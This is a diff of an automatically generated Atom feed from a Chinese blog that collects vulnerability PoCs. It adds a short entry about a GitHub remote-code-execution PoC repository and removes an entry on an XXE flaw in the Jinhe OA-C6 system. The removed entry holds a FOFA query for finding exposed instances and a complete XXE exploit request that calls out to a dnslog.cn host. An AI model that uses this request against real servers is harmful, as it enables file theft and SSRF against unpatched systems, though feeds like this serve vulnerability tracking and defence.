@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-11T12:45:20.384Z</updated>
+  <updated>2025-06-11T13:00:19.942Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DennModzz/RCE-CVE-2025</title>
+    <link href="http://example.com/2025/06/11/github_4195639221/"/>
+    <id>http://example.com/2025/06/11/github_4195639221/</id>
+    <published>2025-06-11T13:00:19.944Z</published>
+    <updated>2025-06-11T13:00:19.942Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> DennModzz&#x2F;RCE-CVE-2025</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞描述：</strong> 2025年发现的远程代码执行（RCE）漏洞的PoC。</p><p><strong>来源：</strong> <a href="https://github.com/DennModzz/RCE-CVE-2025">https://github.com/DennModzz/RCE-CVE-2025</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; DennModzz&amp;#x2F;RCE-CVE-2025&lt;/p&gt;
+&lt;p&gt;&lt;str</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+  </entry>
   
   <entry>
     <title>WordPress RevSlider - Remote Code Execution via File Upload</title>
@@ -520,33 +547,6 @@
     <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
     <category term="文件读取" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>金和OA-C6系统接口ActionDataSet XXE漏洞</title>
-    <link href="http://example.com/2025/06/11/github_2319726456/"/>
-    <id>http://example.com/2025/06/11/github_2319726456/</id>
-    <published>2025-06-11T08:15:30.461Z</published>
-    <updated>2025-06-11T08:15:30.458Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 金和OA-C6系统接口ActionDataSet XXE漏洞</p><p><strong>漏洞类型：</strong> XML实体注入</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 金和OA-C6系统接口ActionDataSet存在XXE漏洞，攻击者可利用此漏洞获取服务器敏感数据，读取任意文件以及进行SSRF攻击，存在一定的安全隐患。</p><p><strong>产品厂商：</strong> 金和网络</p><p><strong>产品名称：</strong> 金和OA-C6</p><p><strong>搜索语法：</strong> app&#x3D;”金和网络-金和OA”</p><p><strong>来源：</strong> <a href="https://github.com/eeeeeeeeee-code/POC/blob/03ee0f8dda8122d411357707752b9e9def59deb5/wpoc%2F%E9%87%91%E5%92%8COA%2F%E9%87%91%E5%92%8COA-C6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ActionDataSet%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md">https://github.com/eeeeeeeeee-code/POC/blob/03ee0f8dda8122d411357707752b9e9def59deb5/wpoc%2F%E9%87%91%E5%92%8COA%2F%E9%87%91%E5%92%8COA-C6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ActionDataSet%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md</a></p><p><strong>类型：</strong> eeeeeeeeee-code&#x2F;POC:github commit</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="金和OA-C6系统接口ActionDataSet存在XXE漏洞"><a href="#金和OA-C6系统接口ActionDataSet存在XXE漏洞" class="headerlink" title="金和OA-C6系统接口ActionDataSet存在XXE漏洞"></a>金和OA-C6系统接口ActionDataSet存在XXE漏洞</h2><p>金和OA-C6系统接口ActionDataSet存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。</p><h3 id="fofa"><a href="#fofa" class="headerlink" title="fofa"></a>fofa</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app=<span class="hljs-string">&quot;金和网络-金和OA&quot;</span><br></code></pre></td></tr></table></figure><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /jc6/servlet/<span class="hljs-title class_">ActionDataSet</span> <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: <br><span class="hljs-title class_">User</span>-<span class="hljs-title class_">Agent</span>: <span class="hljs-title class_">Mozilla</span>/<span class="hljs-number">5.0</span> (<span class="hljs-title class_">Macintosh</span>; <span class="hljs-title class_">Intel</span> <span class="hljs-title class_">Mac</span> <span class="hljs-variable constant_">OS</span> X <span class="hljs-number">10_15_7</span>) <span class="hljs-title class_">AppleWebKit</span>/<span class="hljs-number">537.36</span> (<span class="hljs-variable constant_">KHTML</span>, like <span class="hljs-title class_">Gecko</span>) <span class="hljs-title class_">Chrome</span>/<span class="hljs-number">135.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> <span class="hljs-title class_">Safari</span>/<span class="hljs-number">537.36</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/xml</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-comment">&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://323232323.xxxx.dnslog.cn&quot;&gt; %remote;]&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; 金和OA-C6系统接口ActionDataSet XXE漏洞&lt;/p&gt;
-&lt;p&gt;&lt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="eeeeeeeeee-code/POC:github commit" scheme="http://example.com/tags/eeeeeeeeee-code-POC-github-commit/"/>
-    
-    <category term="XML实体注入" scheme="http://example.com/tags/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
